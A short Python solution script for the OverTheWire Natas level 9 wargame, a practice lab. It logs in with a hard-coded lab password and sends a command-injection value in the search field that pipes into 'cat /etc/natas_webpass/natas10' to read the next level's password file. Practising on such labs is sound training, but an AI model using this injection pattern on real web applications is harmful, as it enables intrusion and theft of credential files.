#!/usr/bin/env python3

import requests
import re

req = requests.Session()

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
url = "http://%s.natas.labs.overthewire.org" % username


data = {"needle":"a | cat /etc/natas_webpass/natas10 #","submit":"Search"}
req_post = req.post(url,auth=(username,password),data=data)

# print(req_post.text)


nxt_pass = re.findall("<pre>\n(.*)\n</pre>",req_post.text)
print(nxt_pass[0])
